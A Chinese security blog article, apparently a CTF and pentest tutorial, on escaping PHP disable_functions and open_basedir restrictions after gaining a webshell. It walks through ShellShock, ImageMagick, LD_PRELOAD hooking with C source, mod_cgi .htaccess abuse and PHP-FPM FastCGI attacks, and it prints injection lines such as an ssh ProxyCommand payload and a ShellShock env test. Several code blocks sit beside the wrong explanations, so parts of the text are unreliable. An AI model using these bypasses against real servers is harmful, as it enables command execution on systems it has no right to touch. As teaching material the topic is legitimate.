> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_L379eq0kufu3CCHN1DdkA)

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LdRmpz4ibIY8GpicEiabmEOVuDWthuxj2TXBsNCVHu70z5pcUkEHkWCrichUzI2esFfCrwUOpkB24XedQ/640?wx_fmt=gif)

亲爱的, 关注我吧

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LdRmpz4ibIY8GpicEiabmEOVuDWthuxj2TXBsNCVHu70z5pcUkEHkWCrichUzI2esFfCrwUOpkB24XedQ/640?wx_fmt=gif)

**12/25**

本文篇幅有点长

预计要花费 15 分钟的时间阅读哦

来和我一起阅读吧

本文涉及知识点实操练习 - 绕过函数过滤

https://www.hetianlab.com/expc.do?ec=ECID172.19.104.182014092310094200001&pk_campaign=weixin-wemedia   复制上方链接或者点击**阅读原文**即可体验

是否遇到过费劲九牛二虎之力拿了 webshell 却发现连个 scandir 都执行不了? 拿了 webshell 确实是一件很欢乐的事情，但有时候却仅仅只是一个小阶段的结束；本文将会以 webshell 作为起点从头到尾来归纳 bypass disable function 的各种姿势。

从 phpinfo 中获取可用信息
-----------------

信息收集是不可缺少的一环；通常的，我们在通过前期各种工作成功执行代码 or 发现了一个 phpinfo 页面之后，会从该页面中搜集一些可用信息以便后续漏洞的寻找。

我谈谈我个人的几个偏向点：

#### 版本号

最直观的就是 php 版本号（虽然版本号有时候会在响应头中出现），如我的机器上版本号为：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1ntBNo6obuiaoKocp5uG54Uybe4SV6sDYVLSDt1wJbHicRNH1ibIr04CPQ/640?wx_fmt=png)

那么找到版本号后就会综合看看是否有什么 "版本专享" 漏洞可以利用。

#### DOCUMENT_ROOT

接下来就是搜索一下 **DOCUMENT_ROOT** 取得网站当前路径，虽然常见的都是在 / var/www/html，但难免有例外。

#### disable_functions

这是本文的重点，disable_functions 顾名思义函数禁用，以笔者的 kali 环境为例，默认就禁用了如下函数：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1gtCGYQIWibFceEiaY2ia9ABKZay0UwPTJRPK4BS9To5RVpv5UbMBQAqLQ/640?wx_fmt=png)

  
如一些 ctf 题会把 disable 设置的极其恶心，即使我们在上传马儿到网站后会发现什么也做不了，那么此时的绕过就是本文所要讲的内容了。

#### open_basedir

该配置限制了当前 php 程序所能访问到的路径，如笔者设置了：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1iceE9KFsEPb8MX8picRWN4cdBFdtD3fiaibeyuVgLKOyAJSU9GbUPNpc3Q/640?wx_fmt=png)

随后我们能够看到 phpinfo 中出现如下：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1bia0RqyTL4PcZtia8Yq6kicV94kVSQ6pBIf2kK4VaBibmiccjcA7IyQSCWg/640?wx_fmt=png)

尝试 scandir 会发现列根目录失败。

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1via5fW9T8libdQCZeFuYkI6iaMmd0IYKCt3DIiaV4Ac2adicwH4GqcU4M9g/640?wx_fmt=png)

#### opcache

如果使用了 opcache，那么可能达成 getshell，但需要存在文件上传的点，直接看链接：

https://www.cnblogs.com/xhds/p/13239331.html

#### others

如文件包含时判断协议是否可用的两个配置项：

```
allow_url_include、allow_url_fopen
```

上传 webshell 时判断是否可用短标签的配置项：

```
short_open_tag
```

还有一些会在下文讲到

bypass open_basedir
-------------------

因为有时需要根据题目判断采用哪种 bypass 方式，同时，能够列目录对于下一步测试有不小帮助，这里列举几种比较常见的 bypass 方式，均从 p 神博客摘出，推荐阅读 p 神博客原文，这里仅作简略总结。

### syslink

https://www.php.net/manual/zh/function.symlink.php

> symlink ( string `$target` , string `$link` ) : bool
> 
> **symlink()** 对于已有的 `target` 建立一个名为 `link` 的符号连接。

简单来说就是建立软链达成 bypass。

代码实现如下：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1TxiatVeHiawHXLF3m6bGceQ0x120ecWZWceuExSeqPghR0qBg9RajUpA/640?wx_fmt=png)

首先是创建一个 link，将 tmplink 用相对路径指向 abc/abc/abc/abc，然后再创建一个 link，将 exploit 指向 tmplink/../../../../etc/passwd，此时就相当于 exploit 指向了 abc/abc/abc/abc/../../../../etc/passwd，也就相当于 exploit 指向了./etc/passwd，此时删除 tmplink 文件后再创建 tmplink 目录，此时就变为 / etc/passwd 成功跨目录。  
访问 exploit 即可读取到 / etc/passwd。

### glob

> 查找匹配的文件路径模式，是 php 自 5.3.0 版本起开始生效的一个用来筛选目录的伪协议

常用 bypass 方式如下：![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1p8dAUtotk2vWHFKNSUheu9jibcYcQoTHWkC0NfFAmvnY5uwShkyrZWw/640?wx_fmt=png)但会发现比较神奇的是只能列举根目录下的文件。

### chdir() 与 ini_set()

chdir 是更改当前工作路径。

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1avWz3hiasiavh4MVPiaXeHTmNhNxJ0LvuIzZfgrsjicWN0NlghUvehVu5Q/640?wx_fmt=png)

利用了 ini_set 的 open_basedir 的设计缺陷，可以用如下代码观察一下其 bypass 过程：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1nPoVX2IYRB6ibhXBzLFKwTFtxNiatD37Oquvb6TXC2nx0UYLHLYcy9mQ/640?wx_fmt=png)

### bindtextdomain

该函数的第二个参数为一个文件路径，先看代码：![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo13ryVomNbJDEUFu8AkrHzSljzGNFx68GEEdBJYt8MnVWgfSiaQ8KpEeA/640?wx_fmt=png)  
可以看到当文件不存在时返回值为 false，因为不支持通配符，该方法只能适用于 linux 下的暴力猜解文件。

### Realpath

同样是基于报错，但 realpath 在 windows 下可以使用通配符`<`和`>`进行列举，脚本摘自 p 神博客：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1gNZkYsKMZevgla0nVnFAF4AiaYqejicd8uJYlmZMIHcl7lOx1xpDicj6g/640?wx_fmt=png)

### other

如命令执行事实上是不受 open_basedir 的影响的。

bypass disable function
-----------------------

蚁剑项目仓库中有一个各种 disable 的测试环境可以复现，需要环境的师傅可以选用蚁剑的环境。

https://github.com/AntSwordProject/AntSword-Labs

### 黑名单突破

这个应该是最简单的方式，就是寻找替代函数来执行，如 system 可以采用如反引号来替代执行命令。

看几种常见用于执行系统命令的函数

```
system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,``
```

当然了这些也常常出现在 disable function 中，那么可以寻找可以比较容易被忽略的函数，通过函数 or 函数组合拳来执行命令。

*   反引号：最容易被忽略的点，执行命令但回显需要配合其他函数，可以反弹 shell
    
*   pcntl_exec：目标机器若存在 python，可用 php 执行 python 反弹 shell
    

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1OC3lZRczr8t8Kvo8pnHMIIe6X10DjkpTy3eZqiaau10Yje3ulk5wibicg/640?wx_fmt=png)

### ShellShock

#### 原理

本质是利用 bash 破壳漏洞（CVE-2014-6271）。

影响范围在于 bash 1.14 – 4.3

关键在于：

> 目前的 bash 脚本是以通过导出环境变量的方式支持自定义函数，也可将自定义的 bash 函数传递给子相关进程。一般函数体内的代码是不会被执行，但此漏洞会错误的将 “{}” 花括号外的命令进行执行。
> 
> 本地验证方法：
> 
> 在 shell 中执行下面命令：
> 
> env x='() { :;}; echo Vulnerable CVE-2014-6271' bash -c "echo test"
> 
> 执行命令后，如果显示 Vulnerable CVE-2014-6271，证系统存在漏洞，可改变 echo Vulnerable CVE-2014-6271 为任意命令进行执行。
> 
> 详见：https://www.antiy.com/response/CVE-2014-6271.html

因为是设置环境变量，而在 php 中存在着 putenv 可以设置环境变量，配合开启子进程来让其执行命令。

#### 利用

https://www.exploit-db.com/exploits/35146![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1ou1FP85Wibp3kytr4x3aU6Spqc3pRiceXaDZKQs6Nt8EOvPAkJx0AE7Q/640?wx_fmt=png)  
将 exp 上传后即可执行系统命令 bypass disable，就不做过多赘述。

### ImageMagick

#### 原理

漏洞源于 CVE-2016-3714，ImageMagick 是一款图片处理程序，但当用户传入一张恶意图片时，会造成命令注入，其中还有其他如 ssrf、文件读取等，当然最致命的肯定是命令注入。

而在漏洞出来之后各位师傅联想到 php 扩展中也使用了`ImageMagick`，当然也就存在着漏洞的可能，并且因为漏洞的原理是直接执行系统命令，所以也就不存在是否被 disable 的可能，因此可以被用于 bypass disable。

关于更加详细的漏洞分析请看 p 神的文章：CVE-2016-3714 - ImageMagick 命令执行分析，我直接摘取原文中比较具有概括性的漏洞说明：

> 漏洞报告中给出的 POC 是利用了如下的这个委托：
> 
> ```
> strace -f /usr/bin/id
> ```
> 
> 它在解析 https 图片的时候，使用了 curl 命令将其下载，我们看到 %M 被直接放在 curl 的最后一个参数内。ImageMagick 默认支持一种图片格式，叫 mvg，而 mvg 与 svg 格式类似，其中是以文本形式写入矢量图的内容，而这其中就可以包含 https 处理过程。  
> 所以我们可以构造一个. mvg 格式的图片（但文件名可以不为. mvg，比如下图中包含 payload 的文件的文件名为 vul.gif，而 ImageMagick 会根据其内容识别为 mvg 图片），并在 https:// 后面闭合双引号，写入自己要执行的命令
> 
> ```
> close(3)                                = 0
> geteuid32()                             = 0
> getuid32()                              = 0
> getegid32()                             = 0
> getgid32()                              = 0
> (省略....)
> getgroups32(0, NULL)                    = 1
> getgroups32(1, [0])                     = 1
> ```
> 
> 这样，ImageMagick 在正常执行图片转换、处理的时候就会触发漏洞。

漏洞的利用极其简单，只需要构造一张恶意的图片，new 一个类即可触发该漏洞：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo12Stgsm40Wd92bwt4lFxtvtFPAlAticzKBuciaMqWwic3QuKPHOA3ZosVA/640?wx_fmt=png)

#### 利用

那么依旧以靶场题为例，依旧以拥有一句话马儿为前提，我们首先上传一个图片，如上面所述的我们图片的后缀无需 mvg，因此上传一个 jpg 图片：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1uLj8Wiakez3eHaSiboQbKiakgrX7jXUF0fxyrGIialXRE1aP7HicxUyEvzg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1b2t0j6TKAlNz6jhLibSFt7ZVMrwD9YblByacQokFQSXcHGRiaF4ibS2FQ/640?wx_fmt=png)

那么因为我们看不到回显，所以可以考虑将结果写入到文件中，或者直接执行反弹 shell。然后如上上传一个 poc.php：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1UrgVialOHiaPe2YW9tH0msB69xBqkDgbpqYOwicxMWb5MfUfYkumJd62A/640?wx_fmt=png)

访问即可看到我们写入的文件。那么这一流程颇为繁琐（当我们需要多次执行命令进行测试时就需要多次调整图片内容），因此我们可以写一个 php 马来动态传入命令:

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1iaMeNE6N2fcmPVE27nPs6GibH32pnX89FE1oh15YWicef9ee5ztAGNr9Q/640?wx_fmt=png)

### LD_PRELOAD

喜闻乐见的 LD_PRELOAD，这是我学习 web 时遇到的第一个 bypass disable 的方式，个人觉得很有意思。

#### 原理

> LD_PRELOAD 是 Linux 系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。

而我们 bypass 的关键就是利用 LD_PRELOAD 加载库优先的特点来让我们自己编写的动态链接库优先于正常的函数库，以此达成执行 system 命令。

因为 id 命令比较易于观察，网上文章也大同小异采用了 id 命令下的 getuid/getgid 来做测试，为做个试验笔者换成了

我们先看看 id 命令的调用函数：

```
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int getgroups(int size, gid_t list[]){

  unsetenv("LD_PRELOAD");
  system("echo 'i hack it'");
  return 1;
}
```

Resulut:  

```
gcc -shared -fPIC hack.c -o hack.so
```

  
这里可以看到有不少函数可以编写，我选择 getgroups32，我们可以用 man 命令查看一下函数的定义：

```
<?php
mail("","","","");
```

看到这一部分：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1wyE2CZIjibW5OoWXRap3YmTqKvXvPbqfJsOHuYS7by2qibu5ItXzA2Mw/640?wx_fmt=png)

得到了函数的定义，我们只需要编写其内的 getgroups 即可，因此我编写一个 hack.c:、

```
strace -f php phpinfo.php 2>&1 | grep execve
```

  
然后使用 gcc 编译成一个动态链接库：

```
strace sendmail
```

使用 LD_PRELOAD 加载并执行 id 命令，我们会得到如下的结果：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1XRN61Kd7icGJt3Hmg4Xo0MSbjZYx7fPeuOIicuWB0IPdUg0aafOWltww/640?wx_fmt=png)

再来更改一下 uid 测试，我们先 adduser 一个新用户 hhhm，执行 id 命令结果如下：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo17MeicwSpGBmcPSNNoYTzCcgZYkA6QcuCRCGpuxicicqncM5QSc5pzIR6w/640?wx_fmt=png)

然后根据上面的步骤取得 getuid32 的函数定义，据此来编写一个 hack.c：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1GYINKTn6uGflSXicDaByhg9mDBMcic4yTDQicRECK2LyAu0El2xibrbIvg/640?wx_fmt=png)

gcc 编译后，执行，结果如下：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1uiaSR0ibdFOtic2lghHcaBmscLryvDrsvCib2pG13KeADfyL81eiaBvtczw/640?wx_fmt=png)

可以看到我们的 uid 成功变为 1，且更改为 root 了，当然了因为我们的 hack.so 是 root 权限编译出来的，在一定条件下也许可以用此种方式来提权，网上也有相关文章，不过我没实际尝试过就不做过分肯定的说法。

下面看看在 php 中如何配合利用达成 bypass disable。

#### php 中的利用

php 中主要是需要配合 putenv 函数，如果该函数被 ban 了那么也就没他什么事了，所以 bypass 前需要观察 disable 是否 ban 掉 putenv。

php 中的利用根据大师傅们的文章我主要提取出下面几种利用方式，其实质都是大同小异，需要找出一个函数然后采用相同的机制覆盖掉其函数进而执行系统命令。

那么我们受限于 disable，system 等执行系统命令的函数无法使用，而若想要让 php 调用外部程序来进一步达成执行系统命令从而达成 bypass 就只能依赖与 php 解释器本身。

因此有一个大前提就是需要从 php 解释器中启动子进程。

#### 老套路之 mail

先选取一台具有 sendmail 的机器，笔者是使用 kali，先在 php 中写入如下代码

```
fastcgi_pass unix:/var/run/phpfpm.sock;
```

同样的可以使用 strace 来追踪函数的执行过程。

```
pkill php-fpm
/usr/sbin/php-fpm7.0 -c /etc/php/7.0/fpm/php.ini
```

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1Eq17OfAYmjP4j74RiamvNh43bxAB7RsPFiaoYfopicoZhJRLv4U2yqM6w/640?wx_fmt=png)

可以看到这里调用了 sendmail，与网上的文章同样的我们可以追踪 sendmail 来查看其调用过程，或者使用 readelf 可以查看其使用函数：

```
extension=/var/www/html/ant.so
```

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1VGSgiazy1gdaPhTFqlcXbibhhoN8B2Lp5iamoTeX2L90KcEAmDjia9lDQw/640?wx_fmt=png)

那么以上面的方式编写并编译一个动态链接库然后利用 LD_PRELOAD 去执行我们的命令，这就是老套路的利用。  
因为没有回显，为方便查看效果我写了一个 ls>test，因此 hack.c 如下：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1MDxnNAXTLT9VcaS0qEVB6wg5r48oCSmUdMd2iapJz6Mbx0M7K6wACQw/640?wx_fmt=png)

同样的 gcc 编译后，页面写入如下：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1jp66EMGVmia8aO2ormunO3QFTgOaibtonTMWv9td3zmvNw7d5mNLGtfQ/640?wx_fmt=png)

访问页面得到运行效果如下：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1iaCCVASjq7b4f4xwrqGhmamJMGWVEDxGS7Nv9TyGtO0dxbPAPtl9c1A/640?wx_fmt=png)

再提一个我在利用过程中走错的点，这里为测试，我换用一台没有 sendmail 的 ubuntu：  

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1UnjicsIME8S7gvEQeiaxsiaXeaibGyQwVeciajXic2VjbWhuVI7VrZnOibPqA/640?wx_fmt=png)

但如果我们按照上面的步骤直接追踪 index 的执行而不过滤选取 execve 会发现同样存在着 geteuid，并且但这事实上是 sh 调用的而非 mail 调用的，因此如果我们使用 php index.php 来调用会发现 system 执行成功，但如果我们通过页面来访问则会发现执行失败，这是一个在利用过程中需要注意的点，这也就是为什么我们会使用管道符来选取 execve。  
第一个 execve 为 php 解释器启动的进程，而后者即为我们所需要的 sendmail 子进程。

#### error_log

同样的除了 mail 会调用 sendmail 之外，还有 error_log 也会调用，如图：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1T9ttbBOfa3CDIbbdBMZgicj80a5p32tauyynbxE5OmYygmkcc6R6n0w/640?wx_fmt=png)

ps: 当 error_log 的 type 为 1 时就会调用到 sendmail。

因此上面针对于 mail 函数的套路对于 error_log 同样适用，however，我们会发现此类劫持都只是针对某一个函数，而前面所做的都是依赖与 sendmail，而像目标机器如果不存在 sendmail，那么前面的做法就完全无用。

yangyangwithgnu 师傅在其文无需 sendmail：巧用 LD_PRELOAD 突破 disable_functions 提到了我们**不要局限于仅劫持某一函数，而应考虑劫持共享对象**。

#### 劫持共享对象

文中使用到了如下代码编写的库：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1iciat2lPMu5yWa4q4ovLRMF2MQgoH9AtePruXSKlydCWvq0oSEfNyQAQ/640?wx_fmt=png)

那么关于`__attribute__ ((__constructor__))`个人理解是其会在共享库加载时运行，也就是程序启动时运行，那么这一步的利用同样需要有前面说到的启动子进程这一个大前提，也就是需要有类似于 mail、Imagick 可以令 php 解释器启动新进程的函数。

同样的将 LD_PRELOAD 指定为 gcc 编译的共享库，然后访问页面查看，会发现成功将 ls 写到 test 下 (如果失败请检查写权限问题)

0ctf 2019 中 Wallbreaker Easy 中的出题点就是采用了 imagick 在处理一些特定后缀文件时，会调用 ffmpeg，也就是会开启子进程，从而达成加载共享库执行系统命令 bypass disable。

### Apache Mod CGI

前面的两种利用都需要 putenv，如果 putenv 被 ban 了那么就需要这种方式，简单介绍一下原理。

#### 原理

利用 htaccess 覆盖 apache 配置，增加 cgi 程序达成执行系统命令，事实上同上传 htaccess 解析 png 文件为 php 程序的利用方式大同小异。

mod cgi：

> 任何具有 MIME 类型`application/x-httpd-cgi`或者被`cgi-script`处理器处理的文件都将被作为 CGI 脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为 CGI 脚本，一种是文件具有已由`AddType`指令定义的扩展名，另一种是文件位于`ScriptAlias`目录中。

因此我们只需上传一个. htaccess:

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo10PKzfgSUTdueiaWMCovpp93XD1YGFRhaXibrT0VHaCvIV9ecTgf6iaArQ/640?wx_fmt=png)

#### 利用

利用就很简单了：

*   上传 htaccess，内容为上文所给出的内容
    
*   上传 a.test，内容为：
    

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1qFwhVcbmRk2ciccDVyQ9ysxBOM9QiaPtnwo4efnEFK23DaWkohtIvwiaw/640?wx_fmt=png)

### PHP-FPM

php-fpm 相信有读者在配置 php 环境时会遇到，如使用 nginx+php 时会在配置文件中配置如下：![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1YEOdX1BiaN72bkey0z3LmpltNEl0b777jjSRvQzpaicuNes76kp8c3gA/640?wx_fmt=png)  
那么看看百度百科中关于 php-fpm 的介绍：

> PHP-FPM(FastCGI Process Manager：FastCGI 进程管理器) 是一个 PHPFastCGI 管理器，对于 PHP 5.3.3 之前的 php 来说，是一个补丁包 [1] ，旨在将 FastCGI 进程管理整合进 PHP 包中。如果你使用的是 PHP5.3.3 之前的 PHP 的话，就必须将它 patch 到你的 PHP 源代码中，在编译安装 PHP 后才可以使用。

那么 fastcgi 又是什么？Fastcgi 是一种通讯协议，用于 Web 服务器与后端语言的数据交换。

#### 原理

那么我们在配置了 php-fpm 后如访问 http://127.0.0.1/test.php?test=1 那么会被解析为如下键值对：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1DoMdK1NZ5dDAQ7eYbM6SFGEx0y5cuiaViaelIbrco2l6m6EpbqruQMLQ/640?wx_fmt=png)

这个数组很眼熟，会发现其实就是`$_SERVER`里面的一部分，那么 php-fpm 拿到这一个数组后会去找到 SCRIPT_FILENAME 的值，对于这里的 / var/www/html/test.php，然后去执行它。

前面笔者留了一个配置，在配置中可以看到 fastcgi 的端口是 9000，监听地址是 127.0.0.1，那么如果地址为 0.0.0.0，也即是将其暴露到公网中，倘若我们伪造与 fastcgi 通信，这样就会导致远程代码执行。

那么事实上 php-fpm 通信方式有 tcp 也就是 9000 端口的那个，以及 socket 的通信，因此也存在着两种攻击方式。

socket 方式的话配置文件会有如下：

```
$imap = imap_open('{'.$_POST['server'].':993/imap/ssl}INBOX', $_POST['login'], $_POST['password']);
```

那么我们可以稍微了解一下 fastcgi 的协议组成，其由多个 record 组成，这里摘抄一下 p 神原文中的一段结构体：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1phaRO1v4GVD7wmf8y8bkePMOCaphSReruibsjRDjjKkUXHPZL2a3RicQ/640?wx_fmt=png)

可以看到 record 分为 header 以及 body，其中 header 固定为 8 字节，而 body 由其 contentLength 决定，而 paddingData 为保留段，不需要时长度置为 0。

而 type 的值从 1-7 有各种作用，当其 type=4 时，后端就会将其 body 解析成 key-value，看到 key-value 可能会很眼熟，没错，就是我们前面看到的那一个键值对数组，也就是环境变量。

那么在学习漏洞利用之前，我们有必要了解两个环境变量，

*   PHP_VALUE：可以设置模式为 `PHP_INI_USER` 和 `PHP_INI_ALL` 的选项
    
*   PHP_ADMIN_VALUE：可以设置所有选项（除了 disable_function）
    

那么以 p 神文中的利用方式我们需要满足三个条件：

*   找到一个已知的 php 文件
    
*   利用上述两个环境变量将 auto_prepend_file 设置为 php://input
    
*   开启 php://input 需要满足的条件：allow_url_include 为 on
    

此时熟悉文件包含漏洞的童鞋就一目了然了，我们可以执行任意代码了。

这里利用的情况为：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo16tZ3SLBDyofYyWaTj2yXViagHcsWpC7qb1htP3EFEuAAkLgS26KIbdg/640?wx_fmt=png)

#### 利用

我们先直接看 phpinfo 如何标识我们可否利用该漏洞进行攻击。

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1TtMbLSZriaNArDDs2pQicvhCBZr4e7daAw5gKgPvdnx0lezxMYBib1YVA/640?wx_fmt=png)

那么先以攻击 tcp 为例，倘若我们伪造 nginx 发送数据（fastcgi 封装的数据）给 php-fpm，这样就会造成任意代码执行漏洞。

p 神已经写好了一个 exp，因为开放 fastcgi 为 0.0.0.0 的情况事实上同攻击内网相似，所以这里可以尝试一下攻击 127.0.0.1 也就是攻击内网的情况，那么事实上我们可以配合 gopher 协议来攻击内网的 fpm，因为与本文主题不符就不多讲。

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1OeK4c9QT9tz1tDl9bYzKd6uE3L7mkY6Ipc0O5FcB7vHZJ0S6EMELag/640?wx_fmt=png)  

可以看到结果如图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1uv3648Cs8fertuFwIlT3cA3fMLRYFzP5BplN4K0t5IXhc8vnGyBuUA/640?wx_fmt=png)

攻击成功后我们去查看一下 phpinfo 会看到如下：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo18Jdk7hSID2SGxiaNAUhiaeCdWUbgwHDS6XOtC1sWsP6e41icpbIWNqMbA/640?wx_fmt=png)

也就是说我们构造的攻击包为：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1RibY9xcictaiasGlOYdkz6HwpVrLaTZ4hAYkY8G2lPPXmcMl1KvIc9l5A/640?wx_fmt=png)

很明显的前面所说的都是成立的；然而事实上我这里是没有加入 disable 的情况，我们往里面加入 disable 再尝试。

```
ssh -oProxyCommand="ls>test" 192.168.2.1
```

注意修改了 ini 文件后重启 fpm 需要指定 ini。

我往 disable 里压了一个 system：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo130MA4yasXeqJXEAibfibFT1aSulsyztCjYfYxNLyT1PwoLg2oczVO4JQ/640?wx_fmt=png)

然后再执行一下 exp，可以发现被 disable 了：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1l75Z9gSlHvfRwgeTQrrKQicibhudF3fRWwbPWvMrCaV8HPQ2StTezIlg/640?wx_fmt=png)

因此此种方法还无法达成 bypass disable 的作用，那么不要忘了我们的两个 php_value 能够修改的可不仅仅只是 auto_prepend_file，并且的我们还可以修改 basedir 来绕过；在先前的绕过姿势中我们是利用到了 so 文件执行扩展库来 bypass，那么这里同样可以修改 extension 为我们编写的 so 库来执行系统命令，具体利用有师傅已经写了利用脚本，事实上蚁剑中的插件已经能实现了该 bypass 的功能了，那么下面我直接对蚁剑中插件如何实现 bypass 做一个简要分析。

在执行蚁剑的插件时会发现其在当前目录生成了一个. antproxy.php 文件，那么我们后续的 bypass 都是通过该文件来执行，那么先看一下这个 shell 的代码：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1BuPpRia9RZYfx94DkeeJAWXiafPN1NXyOkNrParhms0w8jgE9LyPD8hg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1DLaX3BCYca663NoLyvPOVK9NBuvQ7ZTyeF5Y7JQwQcRmSBXm5ySxTg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1RwicbKmLjk4sabPEEwVcneQQyf2Flf3TiaHhwjgiaoCAicKyHeWiczoLaqA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo13gucZtNdB13UFSyItTUDjkJZfbaQr3ibL8E3BiaPuqcWj3cmwaPH6gOQ/640?wx_fmt=png)

定位到关键代码：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1u5Bo8pexNLJkp2FXsH30pXdIjcRe2shW6YZVbFqb8knap2oIMjjMtg/640?wx_fmt=png)

可以看到它这里向 60882 端口进行通信，事实上这里蚁剑使用`/bin/sh -c php -n -S 127.0.0.1:60882 -t /var/www/html`开启了一个新的 php 服务，并且不使用 php.ini，因此也就不存在 disable 了，那么我们在观察其执行过程会发现其还在 tmp 目录下上传了一个 so 文件，那么至此我们有理由推断出其通过攻击 php-fpm 修改其 extension 为在 tmp 目录下上传的扩展库，事实上从该插件的源码中也可以得知确实如此：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1ErPQPmUdkKMhOcwfp5kJXBDu3oOCR7qEriagYicA4NR56zxbjHiaV9yZw/640?wx_fmt=png)

那么启动了该 php server 后我们的流量就通过 antproxy.php 转发到无 disabel 的 php server 上，此时就成功达成 bypass。

#### 加载 so 扩展

前面虽然解释了其原理，但毕竟理论与实践有所区别，因此我们可以自己打一下 extension 进行测试。

